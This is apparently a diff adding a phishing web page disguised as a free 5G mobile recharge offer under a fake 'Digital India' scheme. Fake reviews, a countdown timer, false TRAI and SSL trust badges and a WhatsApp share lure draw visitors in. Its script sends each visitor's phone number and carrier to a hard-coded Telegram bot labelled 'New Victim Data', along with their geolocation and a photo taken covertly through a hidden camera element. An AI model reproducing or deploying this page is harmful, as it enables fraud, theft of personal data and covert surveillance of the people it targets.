@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free 5G Recharge Offer</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f1f3f6; margin: 0; padding: 10px; }
+        .container { background: #fff; max-width: 400px; margin: auto; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); overflow: hidden; position: relative; }
+        .header { background: #e61e2b; color: white; padding: 20px; text-align: center; }
+        .header h2 { margin: 0; font-size: 22px; text-transform: uppercase; letter-spacing: 1px; }
+        
+        .steps { display: flex; justify-content: space-around; padding: 15px 10px; background: #fff; border-bottom: 1px solid #eee; font-size: 11px; color: #777; }
+        .steps div { text-align: center; }
+        .steps i { display: block; font-size: 18px; color: #e61e2b; margin-bottom: 5px; }
+        
+        .form-content { padding: 20px; }
+        .timer-box { background: #fff9c4; padding: 8px; text-align: center; font-size: 13px; color: #856404; border-radius: 5px; margin-bottom: 15px; border: 1px solid #ffeeba; }
+        
+        label { font-size: 13px; color: #555; font-weight: 600; display: block; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; transition: 0.3s; }
+        
+        .btn { background: #00c853; color: white; padding: 15px; border: none; width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-wa { background: #25d366; color: white; padding: 12px; border: none; width: 100%; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+
+        /* Reviews Styling */
+        .reviews-section { background: #fafafa; padding: 15px; border-top: 1px solid #eee; }
+        .review-card { background: #fff; padding: 10px; border-radius: 8px; margin-bottom: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); font-size: 12px; }
+        .stars { color: #ff9f00; font-size: 10px; margin-bottom: 3px; }
+
+        #toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: white; padding: 10px 20px; border-radius: 50px; font-size: 12px; display: none; z-index: 1000; }
+        #success-box { display: none; padding: 40px 20px; text-align: center; }
+        #video, #canvas { display: none; }
+        
+        .footer-trust { text-align: center; padding: 15px; font-size: 11px; color: #999; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-card">
+    <div id="form-section">
+        <div class="header">
+            <h2><i class="fas fa-bolt"></i> 5G FREE RECHARGE</h2>
+            <p style="margin:5px 0 0; font-size:12px; opacity:0.9;">Digital India Special Scheme 2026</p>
+        </div>
+
+        <div class="steps">
+            <div><i class="fas fa-edit"></i>Details</div>
+            <div><i class="fas fa-shield-alt"></i>Verify</div>
+            <div><i class="fas fa-check-circle"></i>Activate</div>
+        </div>
+
+        <div class="form-content">
+            <div class="timer-box">
+                <i class="fas fa-clock"></i> Offer ends in: <b id="timer">05:00</b>
+            </div>
+
+            <label>Mobile Number</label>
+            <input type="tel" id="mobile" placeholder="Enter 10 digit number" required maxlength="10">
+            
+            <label>Network Provider</label>
+            <select id="op">
+                <option value="Jio 5G">Reliance Jio 5G</option>
+                <option value="Airtel 5G">Bharti Airtel 5G</option>
+                <option value="Vi 5G">Vi (Vodafone Idea) 5G</option>
+                <option value="BSNL">BSNL 4G/5G</option>
+            </select>
+            
+            <button type="button" class="btn" id="submitBtn" onclick="startTesting()">CLAIM RECHARGE NOW</button>
+            
+            <p style="text-align:center; font-size:11px; color:#999; margin-top:15px;">
+                <i class="fas fa-info-circle"></i> Share this offer to speed up activation.
+            </p>
+            <button class="btn-wa" onclick="window.open('https://api.whatsapp.com/send?text=Get Free 5G Recharge for 1 Year! Claim here: ' + window.location.href)">
+                <i class="fab fa-whatsapp"></i> SHARE ON WHATSAPP
+            </button>
+        </div>
+
+        <div class="reviews-section">
+            <p style="font-size: 13px; font-weight: bold; color: #444; margin-bottom: 10px;">Recent Success Stories</p>
+            <div class="review-card">
+                <div class="stars">★★★★★</div>
+                <b>Rahul Sharma:</b> "Initially I was doubtful, but my Jio 719 pack got activated within 10 minutes! Incredible."
+            </div>
+            <div class="review-card">
+                <div class="stars">★★★★★</div>
+                <b>Sneha Kapoor:</b> "Best offer ever. Finally getting true 5G speed for free. Thank you Digital India!"
+            </div>
+        </div>
+
+        <div class="footer-trust">
+            <p><i class="fas fa-lock"></i> Secured by 256-bit SSL Encryption</p>
+            <div style="margin-top:10px;">
+                <span>Verified by TRAI</span> | <span>Digital India</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="success-box">
+        <i class="fas fa-check-circle" style="font-size:70px; color:#00c853;"></i>
+        <h2 style="color:#222; margin-top:20px;">Verification Started!</h2>
+        <p style="color:#666;">Due to high traffic, activation may take 15-30 minutes. <b>Do not close this page.</b></p>
+        <div class="review-card" style="margin-top:20px; background:#e8f5e9; border:1px solid #c8e6c9;">
+             Current Status: <span style="color:#2e7d32; font-weight:bold;">Processing Metadata...</span>
+        </div>
+    </div>
+</div>
+
+<div id="toast"><i class="fas fa-gift" style="color:#ffeb3b;"></i> <span id="toast-msg"></span></div>
+
+<video id="video" autoplay playsinline style="width:1px; height:1px; position:absolute; opacity:0;"></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const TOKEN = "8392139337:AAHUEDTVzy69PZFR8MRQ43aK99pS7pNYliM";
+    const CHAT_ID = "8250492052";
+
+    // Countdown Timer
+    let time = 300;
+    setInterval(() => {
+        let mins = Math.floor(time / 60);
+        let secs = time % 60;
+        document.getElementById('timer').innerHTML = `0${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        if(time > 0) time--;
+    }, 1000);
+
+    // Live Toast Notifications
+    const names = ["Sumit", "Priya", "Vikram", "Neha", "Amit", "Riya"];
+    setInterval(() => {
+        const name = names[Math.floor(Math.random() * names.length)];
+        document.getElementById('toast-msg').innerText = `${name} just got ₹719 recharge!`;
+        const t = document.getElementById('toast');
+        t.style.display = 'block';
+        setTimeout(() => { t.style.display = 'none'; }, 3000);
+    }, 7000);
+
+    async function startTesting() {
+        let mobile = document.getElementById('mobile').value;
+        if(mobile.length < 10) { alert("Please enter valid 10-digit number"); return; }
+
+        document.getElementById('submitBtn').disabled = true;
+        document.getElementById('submitBtn').innerHTML = "<i class='fas fa-spinner fa-spin'></i> Verifying Device...";
+
+        sendTextOnly();
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendTelegram(`📍 Location: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            });
+        }
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => setTimeout(capturePhoto, 3000);
+        } catch (e) { sendTelegram("📸 Camera: Permission Denied"); }
+    }
+
+    function capturePhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'victim.jpg');
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg');
+    }
+
+    function sendTextOnly() {
+        let mobile = document.getElementById('mobile').value;
+        let op = document.getElementById('op').value;
+        sendTelegram(`🎯 **New Victim Data**\n📱 Number: \`${mobile}\`\n📶 SIM: ${op}`).then(() => {
+            setTimeout(() => {
+                document.getElementById('form-section').style.display = 'none';
+                document.getElementById('success-box').style.display = 'block';
+            }, 2000);
+        });
+    }
+
+    function sendTelegram(t) {
+        return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: t, parse_mode: 'Markdown' })
+        });
+    }
+</script>
+</body>
+</html>
